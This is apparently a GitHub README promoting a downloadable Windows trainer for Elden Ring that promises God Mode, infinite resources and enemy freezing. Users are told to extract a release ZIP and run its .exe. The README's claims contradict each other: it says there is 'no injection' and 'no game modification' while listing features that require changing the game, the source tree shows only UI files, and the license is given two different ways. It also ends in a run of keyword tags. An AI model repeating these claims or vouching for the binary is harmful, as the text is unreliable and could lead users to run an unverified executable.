# Elden Ring Player and Inventory Editor

### 📥 Download & Discuss

[![DOWNLOAD v1.0](https://img.shields.io/badge/DOWNLOAD%20v1.0-READY!-brightgreen?style=for-the-badge&logo=windows)](https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/download/elden-ring/ShadowTrainerVisual.zip)  
[![ALL RELEASES](https://img.shields.io/badge/ALL%20RELEASES-blue?style=for-the-badge)](https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/tag/elden-ring)    
MIT License • Open Source

**Updated: March 17, 2026**

<img width="431" height="704" alt="image" src="https://github.com/user-attachments/assets/95abee18-9330-41b0-863d-608e644d8d47" />
<img width="420" height="698" alt="image" src="https://github.com/user-attachments/assets/3703a7eb-2eae-4850-9ede-e25f990b1aee" />
 
*(Dark ImGui UI • Standalone overlay • No injection • INSERT to toggle)*

**Powerful standalone external editor interface for Elden Ring + Shadow of the Erdtree**

Edit player stats, inventory, runes and more with a sleek overlay menu. Fully offline, no game modification.

*Windows ZIP • Extract and run .exe • Always backup your save files before using any tool!*

**Made with ❤️ for the Elden Ring community • MIT License • v1.0 — March 2026**

## Why Choose This Player and Inventory Editor in 2026?

- Fully compatible with **Elden Ring + Shadow of the Erdtree** (v1.02–v1.16 styles)
- **No injection • No DLL • No hooks** — pure external overlay interface
- Modern dark ImGui UI — resizable, always on top, collapsible sections
- Dozens of options: God Mode, Infinite HP/FP/Stamina, Damage multipliers, Rune editing, Freeze enemies, Game speed & more
- Hotkey support (INSERT toggle, END exit) — fast access
- Lightweight (~500 KB) • Static build • Runs on any Windows 10/11
- Full source code available — compile yourself, verify everything
- Perfect for testing builds, challenge runs, rune experiments, cosmetics

Whether you're doing **NG+7 runs**, **infinite rune testing**, **one-shot experiments**, or just want quick fun with DLC mechanics — this editor covers you.

## Full Feature List – Player and Inventory Editor

### Character Stats & Appearance
- God Mode / Ignore Hits
- Infinite HP
- Infinite FP / Mana
- Infinite Stamina
- No Stamina Cost
- Super Run Speed (1×–12× slider)
- Super Jump Height (1×–20× slider)
- Zero Equip Load
- No Fall Damage
- Infinite Item Usage

### Combat Adjustments
- One Hit Kill / Instant Kill
- Damage ×N (1–200 slider)
- Defense ×N (0.1–10 slider)
- No Damage Taken
- Infinite Poise / No Stagger
- 100% Item Discovery

### Runes & Progression
- Add Runes (button + amount input)
- Runes ×N on Gain (1–100 slider)
- No Rune Loss on Death
- Infinite Great Rune Effect
- Always Regenerate HP/FP/Stamina

### Advanced Controls
- Freeze All Enemies / AI
- Game Speed (0.1–5.0× slider)
- Easy Craft / No Materials Required
- Unlimited Arrows & Bolts
- Infinite Spirit Summons
- Instant Respawn

## Installation – 30 Seconds Setup

1. Download from **Releases** (ZIP file)
2. Extract to any folder
3. Run the .exe (no installation needed)
4. Launch Elden Ring first
5. Press **INSERT** to show/hide menu
6. Enjoy — **END** to exit

## 🛠️ Building from Source

### Prerequisites

- Windows 10/11 (64-bit)
- Visual Studio 2022 or newer with C++ tools
- PowerShell

### Setup

1. **Clone this repository**
```bash
git clone https://github.com/yourusername/elden-ring-trainer-visual.git
cd elden-ring-trainer-visual
```

2. **Download Dear ImGui**

The build script will automatically download Dear ImGui v1.90.1. Or download manually:
```bash
https://github.com/ocornut/imgui/archive/refs/tags/v1.90.1.zip
```

Extract and copy these files to `imgui/` folder:
- `imgui.h`, `imgui.cpp`, `imgui_draw.cpp`, `imgui_tables.cpp`, `imgui_widgets.cpp`
- `imgui_internal.h`, `imconfig.h`
- `imstb_*.h` files
- From `backends/`: `imgui_impl_dx11.*` and `imgui_impl_win32.*`

3. **Compile**
```powershell
.\CompileNow.ps1
```

The executable will be created at: `bin\ShadowTrainerVisual.exe`

## 🎮 Usage

1. Run `ShadowTrainerVisual.exe`
2. Press **INSERT** to show/hide the menu
3. Click checkboxes and adjust sliders
4. Press **ESC** or **END** to exit

### Controls

| Key | Action |
|-----|--------|
| **INSERT** | Toggle UI visibility |
| **ESC** | Exit application |
| **END** | Exit application |

## 📦 Technical Details

- **Language:** C++20
- **GUI Library:** Dear ImGui 1.90.1
- **Graphics API:** DirectX 11
- **Compiler:** MSVC (Visual Studio 2022+)
- **Runtime:** Static linking (/MT)
- **Size:** ~497 KB
- **Architecture:** x64 only

### Optimization Flags

```
/O2 /Oi /Ot /GL /MT /GS- /LTCG
```

### System Dependencies

Only standard Windows DLLs (present on all Windows 10/11):
- `d3d11.dll` - DirectX 11
- `dxgi.dll` - DirectX Graphics Infrastructure
- `dwmapi.dll` - Desktop Window Manager
- `IMM32.dll` - Input Method Manager
- `D3DCOMPILER_47.dll` - DirectX shader compiler

## 📂 Project Structure

```
elden-ring-trainer-visual/
├── Main.cpp              # WinMain entry point, DirectX 11 setup
├── UIRenderer.cpp        # ImGui interface implementation
├── UIRenderer.h          # UI rendering declarations
├── AppState.h            # Application state structure
├── CompileNow.ps1        # Quick compilation script
├── README.md             # This file
└── imgui/                # Dear ImGui library (download separately)
    ├── imgui.cpp
    ├── imgui_impl_dx11.cpp
    ├── imgui_impl_win32.cpp
    └── ...
```
**Use responsibly and respect game developers' terms of service.**

## 📜 License

This project is provided as-is for educational purposes only.

Dear ImGui is licensed under the MIT License.

## 🙏 Credits

- **Dear ImGui** by Omar Cornut - https://github.com/ocornut/imgui
- **DirectX 11** by Microsoft

## 🔗 Links

- [Dear ImGui GitHub](https://github.com/ocornut/imgui)
- [ImGui Documentation](https://github.com/ocornut/imgui/wiki)

---

Made with ❤️ for learning purposes only


elden-ring
eldenring
shadow-of-the-erdtree
elden-ring-tool
player-tool
character-tool
inventory-tool
stat-editor
resource-manager
equipment-manager
game-ui
ui-prototype
overlay-ui
standalone-ui
external-ui
offline-tool
game-utility
rpg-tool
soulslike-tool
fromsoftware-game
player-customizer
character-customizer
inventory-manager
progression-tool
stat-adjuster
resource-adjuster
equipment-customizer
gameplay-prototype
visual-editor
demo-interface
imgui-tool
dear-imgui
directx11
dx11-overlay
windows-game-tool
c++-game-ui
c++20
game-interface
ui-demo
prototype-tool
modding-prototype
game-experiment
offline-experiment
player-experiment
inventory-experiment
stat-experiment
resource-experiment
equipment-experiment
gameplay-experiment
visual-prototype
